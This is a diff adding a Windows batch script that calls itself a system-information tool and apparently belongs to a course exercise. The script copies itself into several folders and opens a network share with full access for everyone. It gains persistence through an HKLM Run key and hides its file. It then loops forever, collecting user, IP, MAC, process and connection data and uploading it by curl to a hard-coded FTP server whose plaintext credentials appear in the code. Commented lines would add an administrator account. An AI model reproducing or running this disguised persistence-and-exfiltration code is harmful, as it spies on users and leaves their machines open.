@@ -1,0 +1,139 @@
+@echo off
+title Informacion del Sistema Juliocrm
+
+:: ================================
+::   @Juliocrm
+:: ================================
+
+:: ================================
+::   REPLICARSE EN OTRAS CARPETAS
+:: ================================
+:: Crear carpeta parcial en C:\
+mkdir C:\parcial 2>nul
+
+copy "%~f0" "C:\parcial\mundial.bat"
+copy "%~f0" "%temp%\mundial.bat"
+copy "%~f0" "%appdata%\mundial.bat"
+
+
+:: ================================
+::   CREAR USUARIO NUEVO
+:: ================================
+:: net user EstudianteUPC 1234 /add
+:: net localgroup Administradores EstudianteUPC /add
+:: echo Usuario EstudianteUPC creado.
+
+:: ==================
+:: ELIMINAR USUARIO
+:: ==================
+:: net user EstudianteUPC /delete
+
+
+:: ================================
+::   CARPETA COMPARTIDA EN RED
+:: ================================
+net share parcial=C:\parcial /grant:everyone,full
+echo Carpeta C:\parcial compartida en red.
+
+:: Agregar al arranque de Windows (HKLM)
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" ^
+/v Mundial ^
+/t REG_SZ ^
+/d "C:\parcial\mundial.bat" ^
+/f
+
+
+:: ================================
+::   OCULTAR EL ARCHIVO
+:: ================================
+attrib +h +s "C:\parcial\mundial.bat"
+echo Archivo ocultado.
+
+
+:loop
+
+:: Limpiar pantalla
+cls
+
+echo ================================
+echo   INFORMACION DEL SISTEMA
+echo ================================
+echo.
+
+echo Version de Windows:
+ver
+echo.
+
+echo Fecha: %date%
+echo Hora:  %time%
+echo.
+
+echo Usuario: %USERNAME%
+echo.
+
+echo Direccion IP:
+ipconfig | findstr IPv4
+echo.
+
+echo Nombre de la maquina: %COMPUTERNAME%
+echo.
+
+echo Lista de Procesos Activos:
+echo --------------------------
+tasklist
+echo.
+
+echo ================================
+echo           @Juliocrm
+echo ================================
+echo.
+
+echo ================================
+echo   INFORMACION DEL SISTEMA
+echo ================================
+echo.
+echo Version de Windows:
+ver
+echo.
+echo Fecha: %date%
+echo Hora:  %time%
+echo.
+echo Usuario: %USERNAME%
+echo.
+echo Direccion IP:
+ipconfig | findstr IPv4
+echo.
+echo Direccion MAC:
+getmac
+echo.
+echo Nombre de la maquina: %COMPUTERNAME%
+echo.
+echo Lista de Procesos Activos:
+echo --------------------------
+tasklist
+echo.
+netstat -ano
+echo ================================
+echo           @Juliocrm
+echo ================================
+) > C:\parcial\datos.txt
+
+echo Archivo actualizado en C:\parcial\datos.txt
+echo.
+
+:: ========================================================
+:: ENVIO AL SERVIDOR FTP MEDIANTE CURL
+:: ========================================================
+echo Subiendo archivo al servidor FTP...
+
+:: --ftp-create-dirs asegura que se cree la carpeta Gr03_%COMPUTERNAME% en el servidor si no existe.
+curl -u u917850771:Unicesar2026+ --ftp-create-dirs -T "C:\parcial\datos.txt" "ftp://82.25.87.225/domains/sistemasoperativos.xyz/NubeParcial/Gr03_%COMPUTERNAME%/Gr03_Rios03.txt"
+
+echo.
+echo Proceso de subida finalizado.
+echo.
+
+:: Esperar 15 segundos antes de repetir el bucle
+timeout /t 30 /nobreak >nul
+
+goto loop
